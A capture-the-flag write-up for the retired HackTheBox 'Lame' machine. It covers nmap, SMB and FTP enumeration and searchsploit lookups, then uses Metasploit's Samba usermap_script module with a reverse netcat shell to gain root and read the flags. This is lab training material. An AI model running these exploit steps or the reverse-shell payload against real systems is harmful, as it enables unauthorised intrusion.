---
title: "Lame"
---

:::info

Description: This is a write-up for the Lame (Retired) Box on [HackTheBox](https://hackthebox.com).

Credits: S/o to tedd_918, hunterbot, Sno0wCS for the assist.

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Linux &#xf17c;|Easy|&#xf058; &#xf058; &#xf058; &#xf058;|

:::

## RECON

### Scan

Network scanning our target for open and vulnerable (`-sC -sV`) ports

Run: `sudo nmap -v -Pn -p- -sC -sV -O --min-rate=5000 -o $OUTPUT_FILE $TARGET_IP`

```bash
# Nmap 7.92 scan initiated Thu Mar 24 20:49:00 2022 as: nmap -v -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-lame.txt 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.52s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.867 days (since Thu Mar 24 00:01:38 2022)
TCP Sequence Prediction: Difficulty=203 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-03-24T03:58:10-04:00
|_clock-skew: mean: 2h08m14s, deviation: 2h49m44s, median: 8m12s

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 24 20:50:39 2022 -- 1 IP address (1 host up) scanned in 99.28 seconds
```

:::tip Nmap Scans

A faster, more concise approach to scanning our target is to do it in two parts:

First, scan all ports: `sudo nmap -v $TARGET_IP -Pn -p- --min-rate=5000 -o $OUTPUT_FILE`

Second, run vulnerability scan ONLY on the open ports: `sudo nmap -v $TARGET_IP p-<open ports> -sC -sV -O --min-rate=5000 -o $OUTPUT_FILE`

:::

We can see SMB ports avaiable, and an anonymous FTP service too.

### Enumerate

We have our open ports telling us smb is available, use `smbclient -L //$TARGET_IP` to list available shares:

```bash
└─$ smbclient -L //10.10.10.3
Enter WORKGROUP\rxhackks password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
                                                                                                                   
┌──(rxhackk㉿kali)-[~/…/RxHack/HTB/BOXES/LAME]-[tun0: 10.10.16.2]
└─$ smbclient //10.10.10.3/opt                 
Enter WORKGROUP\rxhackks password: 
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

let's try `tmp` share

```bash
┌──(rxhackk㉿kali)-[~/…/RxHack/HTB/BOXES/LAME]-[tun0: 10.10.16.2]
└─$ smbclient //10.10.10.3/tmp                                                                                 1 ⨯
Enter WORKGROUP\rxhackks password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 24 20:54:31 2022
  ..                                 DR        0  Sat Oct 31 19:33:58 2020
  5561.jsvc_up                        R        0  Thu Mar 24 00:05:36 2022
  .ICE-unix                          DH        0  Thu Mar 24 00:04:33 2022
  vmware-root                        DR        0  Thu Mar 24 00:04:59 2022
  .X11-unix                          DH        0  Thu Mar 24 00:04:58 2022
  .X0-lock                           HR       11  Thu Mar 24 00:04:58 2022
  vgauthsvclog.txt.0                  R     1600  Thu Mar 24 00:04:32 2022

                7282168 blocks of size 1024. 5386456 blocks available
smb: \> 
```

file `vgauthsvclog.txt.0` looks interesting cos its not zero-byte, `smb:\>get vgauthsvclog.txt.0` to download it.

Park that for a second and let's have a look at FTP

```bash
─$ ftp 10.10.10.3                                                                                                 
Connected to 10.10.10.3.                                                                                           
220 (vsFTPd 2.3.4)                                                                                                 
Name (10.10.10.3:rxhackk): anonymous                                                                               
331 Please specify the password.                                                                                   
Password:                                                                                                          
230 Login successful.                                                                                              
Remote system type is UNIX.                                                                                        
Using binary mode to transfer files.                                                                               
ftp> dir                                                                                                           
229 Entering Extended Passive Mode (|||44364|).                                                                    
150 Here comes the directory listing.                                                                              
226 Directory send OK.                                                                                             
ftp> ls                                                                                                            
229 Entering Extended Passive Mode (|||64982|).                                                                    
150 Here comes the directory listing.                                                                              
226 Directory send OK.                                                                                             
ftp> pwd                                                                                                           
Remote directory: /                                                                                                
ftp> ls -al                                                                                                        
229 Entering Extended Passive Mode (|||18234|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 . 
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||15720|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
```

No files to download from FTP.

Let's go back and check file from smb:

```bash
└─$ cat vgauthsvclog.txt.0 
[Mar 23 07:04:31.888] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Mar 23 07:04:31.888] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Mar 23 07:04:31.888] [ message] [VGAuthService] Group 'service'
[Mar 23 07:04:31.888] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Mar 23 07:04:31.888] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Mar 23 07:04:32.105] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Mar 23 07:04:32.105] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Mar 23 07:04:32.105] [ message] [VGAuthService] Group 'service'
[Mar 23 07:04:32.105] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Mar 23 07:04:32.105] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Mar 23 07:04:32.105] [ message] [VGAuthService] Cannot load message catalog for domain 'VGAuthService', language 'C', catalog dir '.'.
[Mar 23 07:04:32.106] [ message] [VGAuthService] INIT SERVICE
[Mar 23 07:04:32.106] [ message] [VGAuthService] Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
[Mar 23 07:04:32.196] [ message] [VGAuthService] SAMLCreateAndPopulateGrammarPool: Using '/usr/lib/vmware-vgauth/schemas' for SAML schemas
[Mar 23 07:04:32.287] [ message] [VGAuthService] SAML_Init: Allowing 300 of clock skew for SAML date validation
[Mar 23 07:04:32.287] [ message] [VGAuthService] BEGIN SERVICE
```

can't see anything.

Looking back at Nmap results, that `vsFTPd 2.3.4` version looks familiar:

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
```

## EXPLOIT

Let's check searchsploit, to see if that vsftpd version in vulnerable:

```bash
└─$ searchsploit vsFTPd 2.3.4                                                  
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                           | unix/remote/17491.rb
```

Running the exploit, fails to execute the backdoor command.

Tedd from chat suggests try the exploit metasploit to check it's not me (thanks Tedd).

### Metasploit vsFTPd 2.3.4

```bash
└─$ msfconsole -q
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```

Looks like its not FTP, then its SAMBA.

### Metasploit Samba 3.0.20

Looking up the samba version `3.0.20` in searchsploit:

```bash
└─$ searchsploit samba 3.0.20 
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                           | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - Username map script Command Execution (Metasploit) | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                            | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                            | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                    | linux_x86/dos/36741.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Can't find any manual notes so I must have gone "easy mode" and just used metasploit:

```bash
msf6 > search samba 3.0.20                                                                                         
                                                                                                                   
Matching Modules                                                                                                   
================                                                                                                   
                                                                                                                   
   #  Name                                Disclosure Date  Rank       Check  Description                           
   -  ----                                ---------------  ----       -----  -----------                           
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Ex
ecution                                                                                                            
                                                                                                                   
                                                                                                                   
Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script       
                                                                                                                   
msf6 > use exploit/multi/samba/usermap_script                                                                      
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Command shell session 1 opened (10.10.16.2:4444 -> 10.10.10.3:35844 ) at 2022-03-24 21:41:22 +1300


id
uid=0(root) gid=0(root)
pwd
/
```

We've got a root shell to the target!

User and Root flags for the taking:

```bash
# root.txt

ls /root  
Desktop
reset_logs.sh
root.txt
vnc.log
cat /root/root.txt
************************

# user.txt

ls /home
ftp
makis
service
user
find /home -name user.txt
/home/makis/user.txt
cat /home/makis/user.txt
************************
```

Game over.